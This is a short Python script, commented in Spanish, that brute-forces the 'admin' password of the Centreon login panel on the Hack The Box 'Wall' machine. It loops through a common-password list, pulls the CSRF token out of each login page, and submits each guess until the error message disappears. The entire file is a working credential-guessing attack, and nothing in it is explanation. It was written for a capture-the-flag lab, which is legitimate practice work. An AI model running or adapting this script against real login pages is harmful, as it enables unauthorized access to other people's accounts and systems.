#!/user/bin/python3
#Brute Force de la contraseña del usuario 'admin' contra el panel de login del software de Centreon de la maquina Wall de HTB
from pwn import *
import signal,sys,requests,pdb,re,time

#Ctrl+C
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

#Variables globales 
url = "http://10.10.10.157/centreon/"

def makeRequest():
    s = requests.session()
       
    f = open("/opt/SecLists/Passwords/2020-200_most_used_passwords.txt","r")
    
    p1 = log.progress("Centreon login bruteforce")
    time.sleep(2)
    for pwd in f.readlines():
        pwd = pwd.strip('\n')
        p1.status(f"Probando con la contraseña {pwd}")
        r = s.get(url)
        token = re.findall(r'"centreon_token" type="hidden" value="(.*?)"',r.text)[0]

        post_data={
                'useralias':'admin',
                'password':pwd,
                'submitLogin':'Connect',
                'centreon_token': token
                }
        
        r = s.post(url, data=post_data)
        
        if "Your credentials are incorrect." not in r.text:
            p1.status(f"La contraseña correcta es {pwd}")
            break

if __name__ == '__main__':
    makeRequest()
